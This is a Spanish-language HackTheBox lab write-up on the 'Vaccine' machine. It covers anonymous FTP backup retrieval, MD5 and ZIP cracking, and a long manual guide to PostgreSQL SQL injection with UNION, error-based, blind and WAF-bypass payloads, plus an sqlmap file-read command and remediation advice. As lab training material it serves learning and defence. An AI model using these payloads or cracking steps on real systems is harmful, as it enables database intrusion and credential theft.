# Informe de Seguridad - HackTheBox: Vaccine

**IP Objetivo:** 10.129.215.157  
**Fecha:** 2026-09-10  

---

## 1. Resumen Ejecutivo

Se realizó un reconocimiento y análisis de seguridad completo de la máquina **Vaccine** de HackTheBox. Se identificaron **5 hallazgos** incluyendo una vulnerabilidad **CRÍTICA** de SQL Injection que permite acceso completo a la base de datos y extracción de credenciales del sistema.

| Severidad | Cantidad |
|-----------|----------|
| CRITICAL  | 1        |
| HIGH      | 2        |
| MEDIUM    | 1        |
| INFO      | 1        |

---

## 2. Metodología

1. **Reconocimiento:** Escaneo de puertos y servicios con Nmap
2. **Enumeración:** Análisis de servicios FTP, HTTP y obtención de backup
3. **Análisis de Vulnerabilidades:** Pruebas manuales de SQL Injection
4. **Explotación:** Extracción de datos y credenciales
5. **Post-Explotación:** Lectura de archivos del servidor

---

## 3. Hallazgos

### 3.1 [CRITICAL] SQL Injection en Dashboard de Búsqueda

**Endpoint:** `http://10.129.215.157/dashboard.php`  
**Parámetro:** `search` (GET)  
**DBMS:** PostgreSQL  
**CWE:** CWE-89  

**Código vulnerable (dashboard.php:50):**
```php
$q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
$result = pg_query($conn,$q);
```

El parámetro `search` se concatena directamente a la query SQL sin sanitización ni uso de prepared statements.

**Tipos de inyección confirmados:**
- Boolean-based blind
- Error-based
- Stacked queries
- Time-based blind

---

### 3.2 [HIGH] Credenciales de Base de Datos Expuestos

**Ubicación:** `dashboard.php:41`  
```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Credenciales hardcoded en el código fuente: `postgres:P@s5w0rd!`

---

### 3.3 [HIGH] Backup ZIP con Credenciales en FTP Anónimo

**Servicio:** FTP (Puerto 21)  
**Archivo:** `backup.zip`  
**Contraseña ZIP:** `741852963`  

El archivo contiene `index.php` con hash MD5 de la contraseña de admin: `2cb42f8734ea607eefed3b70af13bbd3` → crackeado a `qwerty789`

---

### 3.4 [MEDIUM] FTP Acceso Anónimo Habilitado

**Puerto:** 21/tcp  
**Servicio:** vsftpd 3.0.3  

Permite acceso anónimo y descarga de archivos de backup.

---

### 3.5 [INFO] Servicios Identificados

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 8.0p1 |
| 80/tcp | HTTP | Apache 2.4.41 |

---

## 4. SQL Injection Manual - Guía Detallada

### 4.1 Identificación del Punto de Inyección

El parámetro `search` en `dashboard.php` acepta entrada del usuario y la refleja en la query SQL. Para identificar inyección manualmente:

**Paso 1: Test con comilla simple**
```
GET /dashboard.php?search=' HTTP/1.1
```
**Resultado:** Error PostgreSQL:
```
ERROR: unterminated quoted string at or near "'"
```
Esto confirma que la comilla cierra un string en la query, indicando SQL Injection.

**Paso 2: Test con condición booleana**
```
GET /dashboard.php?search=test' AND '1'='1 HTTP/1.1
```
Si retorna resultados normales = vulnerable.

```
GET /dashboard.php?search=test' AND '1'='2 HTTP/1.1
```
Si NO retorna resultados = vulnerable (confirma boolean-based).

**Paso 3: Test con commentarios**
```
GET /dashboard.php?search=test'-- HTTP/1.1
```
Si la query se ejecuta sin error, podemos inyectar después de la comilla.

---

### 4.2 UNION-Based SQL Injection

El UNION SELECT permite combinar resultados de nuestra query maliciosa con la query original.

**Paso 1: Determinar número de columnas**
```
GET /dashboard.php?search=x' ORDER BY 1-- OK
GET /dashboard.php?search=x' ORDER BY 2-- OK
GET /dashboard.php?search=x' ORDER BY 3-- OK
GET /dashboard.php?search=x' ORDER BY 4-- OK
GET /dashboard.php?search=x' ORDER BY 5-- ERROR (4 columnas)
```

**Paso 2: Encontrar columnas **
```
GET /dashboard.php?search=x' UNION SELECT 1,2,3,4-- 
```
Las columnas 1 (name), 2 (type), 3 (fueltype), 4 (engine) se muestran en pantalla.

**Paso 3: Extraer versión de la base de datos**
```
GET /dashboard.php?search=x' UNION SELECT version(),2,3,4--
```
Resultado: PostgreSQL 12.2 on x86_64...

**Paso 4: Extraer usuario actual**
```
GET /dashboard.php?search=x' UNION SELECT current_user,2,3,4--
```
Resultado: `postgres`

**Paso 5: Listar tablas**
```
GET /dashboard.php?search=x' UNION SELECT tablename,2,3,4 FROM pg_tables WHERE schemaname='public'--
```
Resultado: `cars`

**Paso 6: Listar columnas de una tabla**
```
GET /dashboard.php?search=x' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='cars'--
```
Resultado: `id, name, type, engine, fueltype`

**Paso 7: Extraer datos**
```
GET /dashboard.php?search=x' UNION SELECT id,name,type,engine FROM cars--
```

---

### 4.3 Error-Based SQL Injection

Usa errores de PostgreSQL para exfiltrar datos.

**Técnica con CAST:**
```
GET /dashboard.php?search=x' AND 1=CAST((SELECT version()) AS NUMERIC)--
```
Retorna error con la versión de PostgreSQL.

**Técnica con CHR (bypass de filtros):**
```
GET /dashboard.php?search=x' AND 1=CAST((CHR(113)||CHR(120)||CHR(107)||CHR(107)||CHR(113))||(SELECT version())::text||(CHR(113)||CHR(98)||CHR(120)||CHR(122)||CHR(113)) AS NUMERIC)--
```
El error muestra los datos entre delimitadores.

---

### 4.4 Blind SQL Injection

Cuando no hay errores visibles ni datos reflejados.

**Boolean-based blind:**
```
# Si el usuario es postgres, retorna resultados
GET /dashboard.php?search=x' AND (SELECT 1 FROM pg_user WHERE usename='postgres')::text='1'--

# Si no existe, no retorna nada
GET /dashboard.php?search=x' AND (SELECT 1 FROM pg_user WHERE usename='admin')::text='1'--
```

**Time-based blind:**
```
# Si condición es TRUE, espera 5 segundos
GET /dashboard.php?search=x' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)::text='1'--

# Extracción bit a bit
GET /dashboard.php?search=x' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END)::text='1'--
```

**Estrategia de extracción con boolean blind:**
```
# Para extraer cada carácter, usar binary search
# Ejemplo: extraer primer carácter del password
GET /dashboard.php?search=x' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100) THEN 1 ELSE 0 END)::text='1'--

# Ajustar el rango (100, 110, 105, etc.) hasta encontrar el carácter exacto
# ASCII 113 = 'q', 119 = 'w', etc.
```

---

### 4.5 Bypass de Filtros y WAF

**Uso de comentarios para evadir filtros:**
```
GET /dashboard.php?search=x'/**/UNION/**/SELECT/**/1,2,3,4--
```

**Case manipulation:**
```
GET /dashboard.php?search=x' UnIoN SeLeCt 1,2,3,4--
```

**Uso de encoding:**
```
# URL encode de caracteres especiales
GET /dashboard.php?search=x%27%20UNION%20SELECT%201%2C2%2C3%2C4--
```

**Uso de CHR() para evitar strings literales:**
```
GET /dashboard.php?search=x' UNION SELECT CHR(112)||CHR(111)||CHR(115)||CHR(116)||CHR(103)||CHR(114)||CHR(101)||CHR(115),2,3,4--
```
Resultado: `postgres`

---

### 4.6 Extracción Completa de Credenciales (Manual)

**Paso 1: Identificar tablas con usuarios**
```
GET /dashboard.php?search=x' UNION SELECT tablename,2,3,4 FROM pg_tables WHERE schemaname='public' AND tablename LIKE '%user%'--
```

**Paso 2: Listar columnas de la tabla users**
```
GET /dashboard.php?search=x' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='users'--
```

**Paso 3: Extraer usuarios y passwords**
```
GET /dashboard.php?search=x' UNION SELECT username,password,3,4 FROM users--
```

**Paso 4: Crackear hashes**
```bash
# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# or
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 5. Explotación Realizada

### 5.1 FTP - Descarga de Backup
```bash
ftp -n 10.129.215.157
> user anonymous anonymous
> binary
> get backup.zip
```
Password ZIP crackeado: `741852963`

### 5.2 Extracción de Hash MD5
Desde `index.php` del backup:
```
admin:2cb42f8734ea607eefed3b70af13bbd3
```
Crackeado con john: `qwerty789`

### 5.3 Login al Dashboard
```
POST http://10.129.215.157/
username=admin&password=qwerty789
```

### 5.4 SQL Injection - Extracción de Datos
```bash
# Versión de DB
/search=x' UNION SELECT version(),2,3,4--
# PostgreSQL 12.2

# Usuario actual  
/search=x' UNION SELECT current_user,2,3,4--
# postgres

# Tablas
/search=x' UNION SELECT tablename,2,3,4 FROM pg_tables WHERE schemaname='public'--
# cars

# Datos completos
/search=x' UNION SELECT id,name,type,engine FROM cars--
```

### 5.5 Lectura de Archivos del Servidor
```bash
sqlmap -u "http://10.129.215.157/dashboard.php?search=zeus" \
  --cookie="PHPSESSID=xxx" --batch --dbms=postgresql \
  --file-read=/var/www/html/dashboard.php
```
Obtenido: credenciales `postgres:P@s5w0rd!`

### 5.6 Dump Completo de la Base de Datos
```
+----+--------+---------+----------+----------+
| id | name   | type    | engine   | fueltype |
+----+--------+---------+----------+----------+
| 1  | Elixir | Sports  | 2000cc   | Petrol   |
| 2  | Sandy  | Sedan   | 1000cc   | Petrol   |
| 3  | Meta   | SUV     | 800cc    | Petrol   |
| 4  | Zeus   | Sedan   | 1000cc   | Diesel   |
| 5  | Alpha  | SUV     | 1200cc   | Petrol   |
| 6  | Canon  | Minivan | 600cc    | Diesel   |
| 7  | Pico   | Sed     | 750cc    | Petrol   |
| 8  | Vroom  | Minivan | 800cc    | Petrol   |
| 9  | Lazer  | Sports  | 1400cc   | Diesel   |
| 10 | Force  | Sedan   | 600cc    | Petrol   |
+----+--------+---------+----------+----------+
```

---

## 6. Credenciales Descubiertas

| Servicio | Usuario | Contraseña | Método |
|----------|---------|------------|--------|
| PostgreSQL | postgres | P@s5w0rd! | SQL Injection (file read) |
| Login Web | admin | qwerty789 | Backup ZIP → MD5 crack |
| FTP | anonymous | (sin password) | Acceso anónimo |

---

## 7. Recomendaciones

### Prioridad CRÍTICA
1. **Usar Prepared Statements** para todas las queries SQL:
   ```php
   $result = pg_prepare($conn, "search", "SELECT * FROM cars WHERE name ILIKE $1");
   $result = pg_execute($conn, "search", array("%".$_REQUEST['search']."%"));
   ```

### Prioridad ALTA
2. **Eliminar credenciales hardcoded** del código fuente
3. **Deshabilitar FTP anónimo** o eliminar archivos sensibles
4. **Cifrar contraseñas** con bcrypt/argon2, no MD5

### Prioridad MEDIA
5. **Implementar WAF** para filtrar patrones de SQLi
6. **Validar y sanitizar** todas las entradas del usuario
7. **Aplicar principio de mínimo privilegio** en la BD

---

## 8. Tools Utilizados

- **Nmap** - Escaneo de puertos y servicios
- **John the Ripper** - Crackeo de hashes (ZIP y MD5)
- **SQLMap** - Explotación automatizada de SQLi
- Burpsuite - Explotación manual de SQLi
- **cURL** - Pruebas manuales de inyección
- **FTP** - Descarga de archivos

---






---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../apuntes Andres/08.09.2026 SQLi Inyecciones - Labs I.md|08.09.2026 SQLi Inyecciones - Labs I]] — Metodologia Pentest, SQL Injection, Testing
- [[../apuntes evolve/BLOQUE 15.md|BLOQUE 15]] — Metodologia Pentest, SQL Injection, Testing
- [[../transcripciones/Septiembre/08.09.2026 SQLi Inyecciones - Labs I.md|08.09.2026 SQLi Inyecciones - Labs I]] — Metodologia Pentest, SQL Injection, Testing
- [[../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Hack The Box, Metodologia Pentest, SQL Injection
- [[../apuntes Joselu/MODULO2/resumen_master_clase16.md|resumen_master_clase16]] — Hack The Box, Metodologia Pentest, SQL Injection

### 🌐 Cross-Dominio

- [[../../programacion/GraphQL/fundamentos_graphql.md|fundamentos_graphql]] — Programacion: Desarrollo Web, Seguridad, Testing
- [[../../programacion/NestJS/patrones_nestjs.md|patrones_nestjs]] — Programacion: Desarrollo Web, Seguridad, Testing

> #arquitectura #crypto #database #hack_the_box #john_hashcat #nmap #pentest #post_explotacion #redes #redes_ciber #seguridad #sql #sqli #sqlmap_tool #ssh_tool #testing #web
